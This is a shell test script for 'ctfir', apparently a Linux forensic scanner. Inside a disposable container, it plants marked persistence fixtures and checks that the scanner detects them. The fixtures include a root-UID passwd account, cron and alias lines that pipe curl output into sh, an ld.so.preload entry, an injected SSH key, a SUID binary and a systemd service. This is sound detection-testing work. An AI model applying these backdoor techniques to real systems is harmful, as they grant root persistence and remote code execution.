#!/bin/sh
# ctfir Linux 集成夹具测试（在一次性容器内以 root 运行）
# 正例夹具全部 ctfir-marker 前缀；阶段3 清理并复验。容器即弃，宿主无残留。
# 用法: sh fixture_linux.sh /tmp/build/ctfir
BIN="$1"
[ -x "$BIN" ] || { echo "usage: $0 <ctfir-binary>"; exit 2; }
OUT=/tmp/ctfir-fixtest
pass=0; fail=0
ok()  { pass=$((pass+1)); echo "[PASS] $1"; }
bad() { fail=$((fail+1)); echo "[FAIL] $1"; }
has_rule()  { grep -q "$1" "$OUT/findings.json" 2>/dev/null && ok "rule $1 present" || bad "rule $1 MISSING"; }
no_rule()   { grep -q "$1" "$OUT/findings.json" 2>/dev/null && bad "rule $1 should be ABSENT" || ok "rule $1 absent"; }
has_text()  { grep -q "$1" "$OUT/$2" 2>/dev/null && ok "$2 contains '$1'" || bad "$2 missing '$1'"; }

echo "=== 阶段1：负例（干净容器基线）==="
rm -rf "$OUT"
"$BIN" scan --out "$OUT" > /dev/null 2>&1
echo "clean scan exit=$?"
no_rule LNX.ACC.UID0.001
no_rule LNX.PERSIST.PRELOAD.001
no_rule LNX.PERSIST.CRON.001
no_rule LNX.PERSIST.PROFILE.001
no_rule LNX.TRACE.HISTORY.001
no_rule LNX.SUID.UNEXPECTED.001
no_rule LNX.PERSIST.SYSTEMD.001
# 注：容器 /etc/hosts 含 docker 注入的主机名行，HOSTS.MAP 属预期命中，不做负例断言

echo "=== 阶段2：正例夹具（全部 ctfir-marker 前缀）==="
mkdir -p /etc/cron.d /etc/profile.d /etc/systemd/system /root/.ssh /usr/bin
echo 'ctfir-marker:x:0:0:marker:/tmp:/bin/sh' >> /etc/passwd
echo '* * * * * root curl http://127.0.0.1/ctfir-marker | sh' > /etc/cron.d/ctfir-marker
echo '/tmp/ctfir-marker-evil.so' > /etc/ld.so.preload
echo '10.66.0.66 ctfir-marker.local' >> /etc/hosts
echo 'alias ls="curl http://127.0.0.1/ctfir-marker | sh"' > /etc/profile.d/ctfir-marker.sh
echo 'alias ls="curl http://127.0.0.1/ctfir-marker | sh"' > /etc/profile.d/ctfir-marker.sh
echo 'wget http://127.0.0.1/ctfir-marker.sh -O /tmp/ctfir-marker-evil.sh' > /root/.bash_history
echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDctfirmarkerctfirmarkerctfirmarkerctfirmarkerctfirmarkerctfirmarkerctfirmarkerctfirmarkerctfirmarkerctfirmarkerctfirmarkerctfirmarkerctfirmarkerctfirmarkerctfirmarker ctfir-marker@test' > /root/.ssh/authorized_keys
cp /bin/busybox /usr/bin/ctfir-marker-suid 2>/dev/null && chmod 4755 /usr/bin/ctfir-marker-suid
printf '[Service]\nExecStart=/tmp/ctfir-marker-evil.sh\n' > /etc/systemd/system/ctfir-marker.service

rm -rf "$OUT"
"$BIN" scan --out "$OUT" > /dev/null 2>&1
echo "fixture scan exit=$?"
has_rule LNX.ACC.UID0.001
has_rule LNX.PERSIST.CRON.001
has_rule LNX.PERSIST.PRELOAD.001
has_rule LNX.HOSTS.MAP.001
has_rule LNX.PERSIST.PROFILE.001
has_rule LNX.TRACE.HISTORY.001
has_rule LNX.SSH.AUTHKEY.001
has_rule LNX.SUID.UNEXPECTED.001
has_rule LNX.PERSIST.SYSTEMD.001
has_text ctfir-marker.local findings.json
# HTML 报告产物 + 无脚本外链
[ -f "$OUT/report.html" ] && ok "report.html exists" || bad "report.html missing"
grep -qi "http://\|https://" "$OUT/report.html" && bad "html has external URL" || ok "html no external URLs"

echo "=== 阶段3：清理并复验 ==="
rm -f /etc/cron.d/ctfir-marker /etc/profile.d/ctfir-marker.sh \
      /etc/systemd/system/ctfir-marker.service /usr/bin/ctfir-marker-suid
rm -f /etc/ld.so.preload
# /etc/hosts 是 docker bind-mount（rename 会 EBUSY）→ 用覆写而非 sed -i
grep -v ctfir-marker /etc/hosts > /tmp/hosts.clean 2>/dev/null && cat /tmp/hosts.clean > /etc/hosts
sed -i '/ctfir-marker/d' /etc/passwd /root/.bash_history /root/.ssh/authorized_keys
rmdir /root/.ssh 2>/dev/null || true
rm -rf "$OUT-clean"
"$BIN" scan --out "$OUT-clean" > /dev/null 2>&1
grep -q "ctfir-marker" "$OUT-clean/findings.json" && bad "marker residue after cleanup" || ok "cleanup verified"

echo "=== 阶段4：fault 例（nobody 低权限 → 权限失败不 PASS）==="
mkdir -p /tmp/nb-out && chmod 777 /tmp/nb-out
su -s /bin/sh nobody -c "$BIN scan --out /tmp/nb-out" > /dev/null 2>&1
nb_exit=$?
echo "nobody scan exit=$nb_exit"
[ "$nb_exit" = "2" ] && ok "low-privilege exit=2 (restricted)" || bad "low-privilege exit=$nb_exit (expect 2)"
grep -q "PERMISSION_DENIED" /tmp/nb-out/module-results.json && ok "PERMISSION_DENIED present" || bad "no PERMISSION_DENIED"
DENIED=$(grep -o '"status":"PERMISSION_DENIED"' /tmp/nb-out/module-results.json | wc -l)
[ "$DENIED" -ge 1 ] && ok "denied modules=$DENIED" || bad "denied modules=0"
grep -q '"overall_status": "PARTIAL"' /tmp/nb-out/session.json && ok "overall PARTIAL" || bad "overall not PARTIAL"
rm -rf /tmp/nb-out

echo "=== 结果: pass=$pass fail=$fail ==="
[ "$fail" -eq 0 ]
